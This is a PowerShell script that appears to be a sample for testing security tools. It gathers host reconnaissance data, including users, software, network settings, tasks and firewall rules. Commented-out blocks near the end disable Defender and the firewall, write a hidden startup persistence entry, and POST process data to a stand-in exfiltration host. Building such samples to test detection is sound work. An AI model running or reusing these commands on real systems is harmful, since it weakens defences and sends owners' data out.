# Suspicious PowerShell script (FOR TESTING ONLY)
# This script collects system information and could be used for reconnaissance

# Display banner
Write-Host "System Information Collection Tool" -ForegroundColor Cyan
Write-Host "--------------------------------" -ForegroundColor Cyan
Write-Host "This script collects detailed system information" -ForegroundColor Yellow
Write-Host "FOR TESTING SECURITY TOOLS ONLY" -ForegroundColor Red
Write-Host ""

# Get basic system information
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerBIOS = Get-CimInstance CIM_BIOSElement
$computerOS = Get-CimInstance CIM_OperatingSystem
$computerCPU = Get-CimInstance CIM_Processor
$computerHDD = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID = 'C:'"

# Output system information
Write-Host "System Information:" -ForegroundColor Green
Write-Host "-------------------" -ForegroundColor Green
Write-Host "Manufacturer: $($computerSystem.Manufacturer)"
Write-Host "Model: $($computerSystem.Model)"
Write-Host "Serial Number: $($computerBIOS.SerialNumber)"
Write-Host "CPU: $($computerCPU.Name)"
Write-Host "HDD Capacity: $([math]::Round($computerHDD.Size/1GB, 2)) GB"
Write-Host "HDD Space: $([math]::Round($computerHDD.FreeSpace/1GB, 2)) GB free of $([math]::Round($computerHDD.Size/1GB, 2)) GB"
Write-Host "RAM: $([math]::Round($computerSystem.TotalPhysicalMemory/1GB, 2)) GB"
Write-Host "Operating System: $($computerOS.Caption) $($computerOS.Version)"
Write-Host "User logged In: $($computerSystem.UserName)"
Write-Host "Last Boot: $($computerOS.LastBootUpTime)"

# Get network information
Write-Host ""
Write-Host "Network Information:" -ForegroundColor Green
Write-Host "-------------------" -ForegroundColor Green
$networkAdapters = Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }
foreach($nic in $networkAdapters) {
    Write-Host "Interface: $($nic.Description)"
    Write-Host "IP Address: $($nic.IPAddress[0])"
    Write-Host "Subnet Mask: $($nic.IPSubnet[0])"
    Write-Host "Default Gateway: $($nic.DefaultIPGateway)"
    Write-Host "DNS Servers: $($nic.DNSServerSearchOrder)"
    Write-Host "MAC Address: $($nic.MACAddress)"
    Write-Host ""
}

# Get running processes
Write-Host "Running Processes:" -ForegroundColor Green
Write-Host "-----------------" -ForegroundColor Green
$processes = Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 10
foreach($process in $processes) {
    Write-Host "$($process.ProcessName) (PID: $($process.Id)) - CPU: $($process.CPU) - Memory: $([math]::Round($process.WorkingSet/1MB, 2)) MB"
}

# Get installed software
Write-Host ""
Write-Host "Installed Software:" -ForegroundColor Green
Write-Host "------------------" -ForegroundColor Green
$software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Where-Object { $_.DisplayName -ne $null } | 
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | 
    Sort-Object DisplayName
foreach($app in $software) {
    Write-Host "$($app.DisplayName) - $($app.DisplayVersion) - $($app.Publisher)"
}

# Get user accounts
Write-Host ""
Write-Host "User Accounts:" -ForegroundColor Green
Write-Host "--------------" -ForegroundColor Green
$users = Get-LocalUser
foreach($user in $users) {
    Write-Host "Username: $($user.Name) - Enabled: $($user.Enabled) - Last Logon: $($user.LastLogon)"
}

# Get scheduled tasks
Write-Host ""
Write-Host "Scheduled Tasks:" -ForegroundColor Green
Write-Host "---------------" -ForegroundColor Green
$tasks = Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" } | Select-Object -First 10
foreach($task in $tasks) {
    Write-Host "Task: $($task.TaskName) - State: $($task.State) - Path: $($task.TaskPath)"
}

# Get firewall rules
Write-Host ""
Write-Host "Firewall Rules:" -ForegroundColor Green
Write-Host "--------------" -ForegroundColor Green
$rules = Get-NetFirewallRule | Where-Object { $_.Enabled -eq $true -and $_.Direction -eq "Inbound" } | Select-Object -First 10
foreach($rule in $rules) {
    Write-Host "Rule: $($rule.DisplayName) - Action: $($rule.Action) - Direction: $($rule.Direction)"
}

# Suspicious part - attempt to disable security features (commented out for safety)
<#
Write-Host ""
Write-Host "Attempting to disable security features..." -ForegroundColor Red
Set-MpPreference -DisableRealtimeMonitoring $true
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
#>

# Suspicious part - attempt to create persistence (commented out for safety)
<#
Write-Host ""
Write-Host "Attempting to create persistence..." -ForegroundColor Red
$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system_monitor.ps1"
"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $PSCommandPath" | Out-File -FilePath $startup
#>

# Suspicious part - attempt to exfiltrate data (commented out for safety)
<#
Write-Host ""
Write-Host "Attempting to exfiltrate data..." -ForegroundColor Red
$data = Get-Process | ConvertTo-Json -Compress
Invoke-WebRequest -Uri "http://suspicious-data-collection.com/exfil" -Method POST -Body $data
#>

Write-Host ""
Write-Host "Script execution complete" -ForegroundColor Cyan
Write-Host "This was a test script for security tools - no data was exfiltrated" -ForegroundColor Yellow
